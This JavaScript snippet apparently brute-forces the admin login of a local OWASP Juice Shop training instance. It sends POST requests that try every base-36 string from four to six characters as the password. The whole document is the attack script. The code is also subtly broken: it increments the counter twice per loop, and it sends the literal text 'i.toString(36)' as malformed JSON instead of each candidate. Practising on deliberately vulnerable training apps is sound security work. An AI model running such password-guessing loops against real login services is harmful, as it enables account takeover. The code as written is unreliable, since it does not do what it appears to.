for(i=parseInt("aaaa", 36);i++<=parseInt("zzzzzz", 36); i++){
	console.log(i.toString(36));
	fetch("http://localhost:3000/rest/user/login", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/json"
    },
    "referrer": "http://localhost:3000/",
    "body": "{\"email\":\"admin@juiceshop.up\",\"password\":i.toString(36)}",
    "method": "POST",
    "mode": "cors"
});

}
